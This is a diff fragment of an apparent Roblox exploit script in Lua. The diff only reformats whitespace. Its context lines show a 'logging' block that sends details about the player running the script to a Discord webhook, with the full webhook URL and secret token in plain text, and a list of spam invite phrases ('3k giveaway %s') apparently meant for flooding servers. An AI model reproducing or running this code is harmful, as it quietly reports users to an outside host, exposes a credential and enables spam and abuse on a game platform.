@@ -33,7 +33,7 @@ local replicated = game:GetService('ReplicatedStorage')
 -----------------
 --[[ logging ]]--
 -----------------
-local client    = players.LocalPlayer
+local client = players.LocalPlayer
 
 request({
     Url     = 'https://discord.com/api/webhooks/1329366427295154186/Yfee3TElJUh5pp_Ow6MoBwHub8tu_DMth8ys7antyxbETufnHGAvvvP3SHHi8FYDPGkA',
@@ -82,10 +82,10 @@ local url       = '/inflict'
 local chars     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
 local phrases   = {
 	'ss06 & ss07 were here %s',
-    'hot people join %s',
-    '3k giveaway %s',
-    'hey you! yeah, you! join %s',
-    'join %s for friends!'
+    	'hot people join %s',
+    	'3k giveaway %s',
+    	'hey you! yeah, you! join %s',
+    	'join %s for friends!'
 }
 
 function gen(len)
